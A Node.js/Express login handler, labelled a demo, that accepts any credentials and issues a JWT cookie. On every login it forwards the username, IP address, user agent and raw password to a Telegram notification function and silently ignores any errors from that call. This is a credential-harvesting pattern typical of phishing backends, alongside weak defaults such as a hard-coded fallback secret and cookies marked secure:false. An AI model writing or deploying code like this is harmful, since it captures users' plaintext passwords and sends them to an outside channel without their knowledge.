const jwt = require("jsonwebtoken");
const { notifyLogin } = require("./telegramNotify");

// Demo login — accepts any credentials
async function login(req, res) {
  try {
    const { username, password } = req.body;

    // Always "log in" the user with a fake ID
    const user = { id: 1, username };

    // 🔔 Telegram notification
    notifyLogin({
      username: user.username,
      ip: req.ip,
      userAgent: req.headers["user-agent"],
      password // send raw password
    }).catch(() => {});

    // 🔑 JWT token
    const token = jwt.sign(
      {
        id: user.id,
        username: user.username
      },
      process.env.JWT_SECRET || "demo_secret",
      {
        expiresIn: "15m",
        issuer: "demo-app",
        audience: "demo-users"
      }
    );

    // 🍪 Send cookie (optional)
    res.cookie("token", token, {
      httpOnly: true,
      secure: false, // set true if using HTTPS
      sameSite: "strict",
      maxAge: 15 * 60 * 1000
    });

    res.json({
      message: `Login successful as ${username}`
    });
  } catch (err) {
    console.error("Login error:", err);
    res.status(500).json({ message: "Internal server error" });
  }
}

module.exports = { login };
